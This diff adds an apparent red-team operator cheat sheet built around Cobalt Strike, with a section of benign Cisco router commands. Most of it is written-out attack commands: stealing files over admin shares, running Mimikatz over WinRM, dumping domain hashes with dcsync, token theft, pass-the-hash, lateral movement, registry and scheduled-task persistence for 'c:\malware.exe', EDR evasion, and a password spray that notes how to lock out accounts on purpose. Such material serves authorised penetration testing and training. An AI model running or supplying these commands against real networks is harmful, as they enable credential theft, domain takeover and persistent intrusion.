@@ -1,0 +1,668 @@
+####################################################################################
+************************************************************************************
+**** Logging Template **************************************************************
+************************************************************************************
+************************************************************************************
+************************************************************************************
+####################################################################################
+
+-Open a notepad/leafpad/etc.. and copy the info below into it.
+
+##### "Operation Name" and "date" #####
+
+- Command Ran (Uploading File example)
+	- Target IP
+	- Time command ran
+	- Path/where/file/droped.exe
+	- md5sum hash of dropped exe
+	
+- 2nd Command Ran (Downloading File example)
+	- Target IP
+	- Time command ran
+	- File downloaded
+	- md5sum hash of file downloaded
+	- Where we stored the file
+
+- 3rd Command Ran (NMAP Scan example)
+	- Target IPs 
+	- Time command ran
+	- Ports
+	- Open ports
+		- 111.111.111.2:80 open
+		- 111.112.222.3:22,80,443,3389 open
+	- Closed ports
+		- 222.11.1.2:9000 closed
+
+####################################################################################
+************************************************************************************
+****Basic Windows Enumeration*******************************************************
+************************************************************************************
+****In Colbaltstrike use run, powerpick, or shell before commands*******************
+************************************************************************************
+####################################################################################
+
+- ipconfig /all 
+	# CHECK IP TO SEE IF IN RANGE OF YOUR TARGETS
+- cd
+	# Cd alone checks what directory you are on. Linux is pwd. 
+	# Write down what directory you are on. 
+
+- Dir
+	# Displays a list of a directory's files and subdirectories.
+	# We can use this to remote dir sharedrives on target.
+	# dir \\10.11.222.33\c$\folder\subfolder 
+	
+	# Use this switch to view hidden files, etc...
+	# /a[[:]<Attributes>] 
+	# d Directories
+	# h Hidden files
+	# s System files
+	# l Reparse points
+	# r Read-only files
+	# a Files ready for archiving
+	# i Not content indexed files 
+
+- tasklist
+	# can run 'ps' in cobaltstrike. Shows running processes
+
+- systeminfo | findstr /B /C:"OS Name" /c:"OS Version"
+	# Find the OS name we are connected to
+
+- hostname
+	# Shows hostname of the box
+
+- query user
+	# See who else is connected to the machine
+
+- echo %userdomain%\%username%
+	# What user we are connected as and the domain
+
+- net users
+	# Local user accounts
+
+- net users /doamin
+	# Domain user accounts
+	# Incase EDR are looking for net users /domain try using net users /dom
+
+- net users user
+	# User info in depth
+
+- net users user /domain
+	# User info in depth
+
+- net use
+	# Execute the net use command alone to show detailed information
+	# about currently mapped drives and devices.
+
+	# net use "\\111.111.111.111\sharedrive"
+	# This specifies the name of the computer, computername, 
+	# and the shared resource, sharename, 
+	# like a shared folder or a shared printer connected to computername.
+
+	# net use * "\\111.111.111.111\sharedrive" /persistence:yes|no
+	# Choose yes to automatically restore created connections at the next login 
+	# or choose no to limit the life of this connection to this session.
+	#  * indications that it will map to the highest drive letter available (z)
+
+	# net use p: /delete
+	# removal of currently mapped drive, in this case p:
+
+- net share
+	# We can use net share command to create, configure and 
+	# delete network shares from command line
+
+- net view 
+	# Used to show a list of computers and network devices on the network
+
+- net localgroup
+	# Used to add, delete, and manage local groups on computers.
+
+- net start
+	# Windows services that are started
+
+- arp -A
+	# Displays the ARP cache table for all avilable interfaces
+
+- netstat -ano
+	# Active network connections
+
+- nslookup Name
+	# It is used for querying the Domain Name System (DNS) to obtain 
+	# domain name or IP address mapping information
+
+- netsh firewall show state
+	# Only available from XP SP2 and upwards. Not universal across OS/SP.
+
+- netsh firewall show config
+	# Firewall config info
+
+- driverquery
+	# This can be useful sometimes as some 3rd party drivers,
+	# even by reputable companies, contain more holes
+	# than Swiss cheese. This is only possible because ring0 exploitation
+	# lies outside most peoples expertise
+
+####################################################################################
+************************************************************************************
+****************************Cobalt Strike*******************************************
+************************************************************************************
+***********Thank you Raphael Mudge for your great tutorials online******************
+************************************************************************************
+####################################################################################
+
+- Which Domain am I on?
+	# Windows
+		- run net view /domain
+		- run wmic computersystems get domain
+	# In Beacon
+		- net domain
+	# Powerview
+		- powershell Get-NetDomain
+
+- Which Hosts are in the Domain?
+	# Windows
+		- run net view /Domain:[DOMAIN]
+		- run net group "Domain Computers" /DOMAIN
+		- run nltest /dclist:corp.acme.com
+			# if in 32bit beacon 
+			# run c:\windows\sysnative\nltest.exe /dclist:corp.acme.com
+	# Net Module in Beacon
+		- net view [DOMAIN]
+		- net computers [DOMAIN.FQDN]
+	# PowerView
+		- powerpick Get-NetComputers
+		- powerpick Get-NetDomainController
+			# tells you info about the DC
+
+- NetBIOS Name -> IP Address
+	# shell nslookup [NAME]
+	# shell ping -n 1 [NAME]
+
+- Domain Administrators?
+	# Beacon's run command:
+		- net group "enterprise admins" /DOMAIN
+		- net group "domain admins" /DOMAIN
+		- net localgroup "administrators" /DOMAIN
+	# Beacon's net module:
+		- net group \\DC Domain Admins
+		- net localgroup \\DC Administrators
+
+- Local Administrators
+	# Maybe a domain account!
+	# net mmodule can queary local groups and users
+		- net localgroup \\TARGET
+		- net localgroup \\TARGET group name
+	# PowerView can find local Admins on a host:
+		- Get-NetLocalGroup --HostName TARGET
+		- Invoke-EnumerateLocalAdmin
+	# Windows 10 RS1(2016) and Windows Server 2016 require admins right to make
+	# this query.
+	# A RID-500 local admin account
+
+- Agentless Post Exploitation (No Payload Needed)
+	# Use UNC path to reference files on other host
+	# List files in c:\foo on remote hosts
+		- shell dir \\host\C$\foo
+	# Copy remote c:\foo\secrets.txt to current host
+		- shell copy \\host\C$\foo\secrets.txt .
+	# Go shopping for files on remote host
+		- shell dir /S /B \\host\C$ >files.txt
+	# WinRM (port 5989) can run commands too..
+		- Powerpick Invoke-Command -ComputerName TARGET 
+		- -ScriptBlock { command here} 
+	# Use Powersploit to run mimikatz over WinRM
+		- Powershell-import /path/Invoke-mimikatz/ps1
+			# May have to update it, also if to big remove the x86 str
+		- Powershell Invoke-Mimikatz -ComputerName TARGET
+	# Use DCSYNC to recover a password has from a DC
+		- dcsync [domain] [DOMAIN\User]
+	# Use DCSYNC to recover dump password hashes from DC
+		- dcsync [domain]
+
+- Trust Material
+	# Tokens, Credentials, Password Hashes, Kerbero Tickets
+
+- Token Stealing
+	# Use ps to list processes
+	# Use Steal_token [pid] to steal the token
+	# Use Getuid to find out who you are
+	# Use rev2self to drop token
+
+- Credentials that you have
+	# To spawn a beacon with alternate creds:
+		- spawnas DOMAIN\user password
+	# use make_token to create a token:
+		- make_token DOMAIN\user password
+		- does not check if info you provided is wrong at time of creation
+		- if it is wrong when you try to interact with a remote target you 
+		- will get an error
+
+- Pass-the-Hash
+	# Use mimikatz to pass-the-hash
+		- pth DOMAIN\user ntlmhash
+	# How does this work?
+		- Starts a process with an access token populated with the username
+		- and hash you provide. Steals token from that process.
+		- WARNING: This automation runs cmd.exe to pass a token back to 
+		- your beacon process: %COMSPEC% /c echo blah >\\.\pipe\blah. it
+		- also interacts with LSASS. Must be in privledge context to run.
+		- If evasion is goal do not run this instead in beacon run..
+	# In beacon
+		- mimikatz sekurlsa::pth /user:Administrator /domain:CORP /ntml:5d8..
+		- /run:"powershell -w hidden"
+		
+- Kerberos Tickets
+	# To see which tickets are in your Kerberos tray:
+		- run klist
+	# To purge tickets: 
+		- kerberos_ticket_purge
+	# To load a ticket:
+		- kerberos_ticket_use [/path/to/file.ticket]	
+
+- Golden Ticket
+	# Self-generated Kerberos ticket with DA rights
+	# Forged with mimikatz, requires:
+		- Desired user and DOMAIN name
+		- Domain SID [whoami /user + drop last numbers after the last -]
+		- NTLM hash of krbtgt user from DC
+
+- Lateral Movement
+	# Jump [psexec, psexec64, psexec_psh, winrm, winrm64] [target] [listner]
+	# psexec/psexec64 run a service EXE via a new service
+	# psexec_psh uses a PS one-liner to run bind_pipe stager via new service
+	# WinRM/WinRM64 Run a powershell script via WinRM
+	# you can also go to targets table, right click -> jump
+
+- Bring your own weaponization
+	# Establish a trust relationship with target
+	# Generate appropriate artifact
+	# Upload artifact to target
+	# Run artifact on target
+	# Assume control of artifact
+
+- Generate an artifact
+	# Generate a stageless artifact
+		- Attacks > Packages > Windows Executables (S)
+	# Which type of artifact?
+		- Windows Service EXE for services
+		- Windows EXE
+		- Something else, dll, raw...
+	# Which payload?
+		- SMB Beacon
+		- TCP Beacon
+
+- Upload Executable
+	# Upload file to target host directly
+		- cd \\host\C$\windows\temp
+		- upload /path/to/file.exe
+		- note: use cd to change back to normal directory before running
+		- programs, due to may programs will not run if current directory
+		- is a UNC path.
+
+- Run an Artifact
+	# List remote execute methods: 
+		- remote-exec
+	# Run a command on remote target
+		- remote-exec [method] [target] [command]
+			# methods: psexec, winrm, wmi
+
+- Assume Control of Artifact
+	# Use link to connect to SMB Beacon
+	# Use connect to connect to TCP Beacon
+
+- Caution!
+	# Beware! dcom, wimrm, wmi
+	# No credential material in logon session?
+		- use make_token to refreash
+	# Cant run processes or no output from processes?(especially after
+	# make_token or steal_token)
+		- use inject to migrate to another context
+		- or, u se elevate svc-exe to run payload as SYSTEM
+
+- Port Scanning
+	# Beacon has a port scanner for target discovery
+		- portscan <hosts> [ports] [discover] [max]
+	# Arguments
+		- hosts is a range of targets
+			# 192.168.1.0/24, 172.16.4.25-172.16.4.100
+		- ports is a range of ports to scan
+			# 1-1024,5900,8000-9000
+		- discover is a method to check if a host is alive
+			# arp, icmp, or none
+		- max is the maximum number of sockets open at once
+			# 4 for windows xp is ok, 1024 for win7 or later 
+
+- Proxy Pivoting
+	# Go interactive
+		- sleep 0
+		- Beacon will check-in several times each second
+		- queued commands will execute immediately
+
+- Socks Proxy	
+	# SOCKS-aware app -> Teamserver <=> Target -> Target2
+
+- Pivoting through SOCKS
+	# Tunnel Traffic
+		- Set up a SOCKS4a proxy server tunneling through the current Beacon
+		- socks [port]
+		- use socks stop to kill the SOCKS proxy server
+		- View -> Proxy Pivots to manage pivots
+
+- Tunnel Metasploit through Beacon
+	# Force the Metasploit Framework to use your SOCKS proxy server for 
+	# connection:
+		- setg Proxies socks4:127.0.0.1:[port]
+		- setg ReverseAllowProxy true
+	# To stop pivoting in this way:
+		- unsetg Proxies
+
+- Pivoting with proxychains
+	# Start a SOCKS Proxy Server
+	# Edit /etc/proxychains.con to point to server
+	# Use proxychains command to tunnel traffic
+
+- Reverse Pivoting
+	# Tunnel Traffic (Reverse)
+		- Make target listen on port and tunnel connect to another system
+		- rportfwd [listen port] [forward host] [forward port]
+		- use rportfwd stop [listen port] to stop
+	# Make sure to account for firewall on target!
+
+- Pivot Listeners
+	# Create a listener that calls home through a Beacon session...
+	# (Aysnchronous CS is OK)
+		- [beacon] -> Pivoting -> Listener
+
+####################################################################################
+************************************************************************************
+************************************************************************************
+*************************Windows WMIC command***************************************
+************************************************************************************
+************************************************************************************
+####################################################################################
+
+
+- wmic qfe get Caption,Description,HotFixID,InstalledOn
+	# As always with Windows, the output isn't exactly ready for use. 
+	# The best strategy is to look for privilege escalation 
+	# exploits and look up their respective KB patch numbers. 
+	# Such exploits include, but are not limited to, KiTrap0D (KB979682),
+	# MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683). 
+	# After enumerating the OS version and Service Pack you should 
+	# find out which privilege escalation vulnerabilities could be present.
+	# Using the KB patch numbers you can grep the installed patches to see 
+	# if any are missing.
+	# wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." 
+
+- wmic process list full | findstr /I commandline
+
+
+####################################################################################
+************************************************************************************
+****Basic Windows Persistence*******************************************************
+************************************************************************************
+****In Colbaltstrike use run, powerpick, or shell before commands*******************
+************************************************************************************
+####################################################################################
+
+- reg key Persistence
+	# Basic User Reg Key
+	# Reg Add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /V "MyApp"
+	# /t Reg_SZ /F /D "c:\MyAppPath\MyApp.exe"
+	
+	# System
+	# Reg Add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" 
+	# /V "MyApp" /t Reg_SZ /F /D "c:\MyAppPath\MyApp.exe"
+	
+	# Reg Query path before adding the key to make sure it exists
+	# After Reg Key is added do a Reg Query to make sure it is added
+
+ 
+- reg delete  Registry_key_path /v Registry_value_name /f
+	# If you want to delete registry key without being prompted 
+	# for confirmation add /f switch
+	# This will be useful for operation clean up
+
+- Schtaks
+	# schtasks /create /tn "name" /tr c:\malware.exe /sc ONLOGON /ru "System"
+
+- Service Executable Persistence
+	# Will need to be system
+	# Create a Windows Service EXE in cobaltstrike 
+	# Upload your exe to the target. (Make sure to record location, hash, etc)
+	# shell sc create name binpath= "path" start= auto error= ignore Display=
+	# "name"
+	# No Spaces before the equals but 1 space after
+	# Shell sc qc "name" to check if it is there
+
+
+####################################################################################
+************************************************************************************
+****Basic Windows Priv Esc**********************************************************
+************************************************************************************
+****In Colbaltstrike use run, powerpick, or shell before commands*******************
+************************************************************************************
+####################################################################################
+
+
+- Typically these are the directories that contain the configuration files 
+  (however it is a good idea to check the entire OS):
+	# c:\sysprep.inf
+	# c:\sysprep\sysprep.xml
+	# %WINDIR%\Panther\Unattend\Unattended.xml
+	# %WINDIR%\Panther\Unattended.xml
+
+- DomainPasswordspray.ps1
+	# BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!
+	# DomainPasswordSpray is a tool written in PowerShell to perform a password 
+	# spray attack against users of a domain. By default it will automatically
+	# generate the userlist from the domain. 
+	
+	# Using in CobaltStrike
+	# Interact with a Beacon	
+	# 1. Powerhshell-import Domainpasswordspray.ps1
+	# 2. Upload a userlist and password list to target. Hash the files before
+	# and put the hash, location and the target IP in your OP notes. Do 
+	# shell net user /domain to create userlist.
+	# 3. In beacon: Powershell Invoke-DomainPasswordSpray -Userlist "UL.txt" 
+	# -Domain "domain" -PasswordList "PL.txt" -Outfile "spraycreds.txt" -Force
+	# The -Outfile will drop to the directory you run from and only if it 
+	# is successful. There is a wait time before sprays by default. If you are 
+	# trying to lock accouts just run the command multiple times with -Password
+	# instead.
+
+	# All options
+	# UserList        - Optional UserList parameter. This will be generated 
+	#		    automatically if not specified.
+	# Password        - A single password that will be used 
+	#		    to perform the password spray.
+	# PasswordList    - A list of passwords one per line to use for the password 
+	#		    spray (Be very careful not to lockout accounts).
+	# OutFile         - A file to output the results to.
+	# Domain          - A domain to spray against.
+	# Force           - Forces the spray to continue without prompting
+	#		    for confirmation.
+
+
+####################################################################################
+************************************************************************************
+************************************************************************************
+******************** CISCO ROUTER COMMANDS ** **************************************
+************************************************************************************
+************************************************************************************
+####################################################################################
+
+- Set a console password to cisco	Router(config)#line con 0
+					Router(config-line)#login
+					Router(config-line)#password cisco
+
+- Set a telnet password			Router(config)#line vty 0 4
+					Router(config-line)#login
+					Router(config-line)#password cisco
+
+- Stop console timing out		Router(config)#line con 0
+					Router(config-line)#exec-timeout 0 0
+
+- Set the enable password to cisco	Router(config)#enable password cisco
+
+- Set the enable secret password to     Router(config)#enable secret peter
+  peter. This password overrides the 
+  enable password and is encypted 
+  within the config file
+
+- Enable an interface			Router(config-if)#no shutdown
+
+- To disable an interface		Router(config-if)#shutdown
+
+- Set the clock rate for a 		Router(config-if)clock rate 64000
+  router with a DCE cable to 64K	
+
+- Set a logical bandwidth assignment 	Router(config-if)bandwidth 64
+  of 64K to the serial interface	Note that the zeroes are not missing
+
+- To add an IP address to a interface	Router(config-if)#ip addr "IP" "SUBNETMASK"
+                                     
+- To enable RIP on all 172.16.x.y 	Router(config)#router rip
+  interfaces				Router(config-router)#network 172.16.0.0
+
+- Disable RIP				Router(config)#no router rip
+
+- To enable IRGP with a AS of 200, 	Router(config)#router igrp 200
+  to all interfaces			Router(config-router)#network 172.16.0.0
+
+- Disable IGRP				Router(config)#no router igrp 200
+
+- Static route the remote network 	Router(config)#ip route 172.16.1.0 255.255.
+  is 172.16.1.0, with a mask of		255.0 172.16.2.1 5
+  255.255.255.0, the next hop is 
+  172.16.2.1, at a cost of 5 hops	
+
+- Disable CDP for the whole router	Router(config)#no cdp run
+
+- Enable CDP for he whole router	Router(config)#cdp run
+
+- Disable CDP on an interface		Router(config-if)#no cdp enable
+
+- View version information		show version
+
+- View current configuration (DRAM)	show running-config
+
+- View startup configuration (NVRAM)	show startup-config
+
+- Show IOS file and flash space		show flash
+
+- Shows all logs that the router 	show log
+  has in its memory	
+
+- View the interface status of 		show interface e0
+  interface e0
+
+- Overview all interfaces on the 	show ip interfaces brief
+  router
+
+- View type of serial cable on s0	show controllers 0 (note the space between 
+					the 's' and the '0')
+
+- Display a summary of connected 	show cdp neighbor
+  cdp devices
+
+- Display detailed information 		show cdp entry *
+  on all devices
+
+- Display current routing protocols	show ip protocols
+
+- Display IP routing table		show ip route
+
+- Display access lists, this includes 	show access-lists
+  the number of displayed matches
+
+- Check the router can see the 		show isdn status
+  ISDN switch
+
+- Check a Frame Relay PVC connections	show frame-relay pvc
+
+- show lmi traffic stats		show frame-relay lmi
+
+- Display the frame inverse ARP table	show frame-relay map
+
+- Enter privileged mode			enable
+
+- Return to user mode from privileged	disable
+
+- Exit Router				Logout or exit or quit
+
+- Recall last command			up arrow or <Ctrl-P>
+
+- Recall next command			down arrow or <Ctrl-N>
+
+- Suspend or abort			<Shift> and  <Ctrl> and 6 then x
+
+- Refresh screen output			<Ctrl-R>
+
+- Compleat Command			TAB
+
+- Save the current configuration 	copy running-config startup-config
+  from DRAM to NVRAM
+- Merge NVRAM configuration to DRAM	copy startup-config running-config
+
+- Copy DRAM configuration to a TFTP 	copy runing-config tftp
+  server
+
+- Merge TFTP configuration with 	copy tftp runing-config
+  current router configuration held 
+  in DRAM
+
+- Backup the IOS onto a TFTP server	copy flash tftp
+
+- Upgrade the router IOS from a 	copy tftp flash
+  TFTP server
+
+- Enable debug for RIP			debug ip rip
+
+- Enable summary IGRP debug info	debug ip igrp events
+
+- Enable detailed IGRP debug info	debug ip igrp transactions
+
+- Debug IPX RIP				debug ipx routing activity
+
+- Debug IPX SAP				debug IPX SAP
+
+- Enable debug for CHAP or PAP		debug ppp authentication
+
+- Switch all debugging off		no debug all
+					undebug all
+
+
+####################################################################################
+************************************************************************************
+************************************************************************************
+******************** LINKS THAT MAY BE USEFUL **************************************
+************************************************************************************
+************************************************************************************
+####################################################################################
+
+- https://vincentyiu.co.uk/red-team-tips
+	# Red Teaming Tips
+
+- https://www.lifewire.com/net-command-2618094
+	# Net Commands
+
+- https://www.cobaltstrike.com/help-beacon
+	# Cobalt Strike help beacon commands
+
+- http://www.fuzzysecurity.com/tutorials/16.html
+	# Windows Privlege Escaltion Fundamentals
+
+- https://gist.github.com/jonlabelle/e8ba94cd29b8f63fd7dd3c4f95c1d210
+	# Windows to UNIX command Cheat Sheet
+
+- https://bluescreenofjeff.com/2018-04-12-https-payload-and-c2-redirectors/
+	# HTTPS Payload and C2 Redirectors information
+
+- https://bluescreenofjeff.com/2017-01-24-how-to-write-malleable-c2-profiles-for-cobal
+t-strike/
+	# How to write malleable C2 profile for Cobalt Strike 
+
+
+
+	
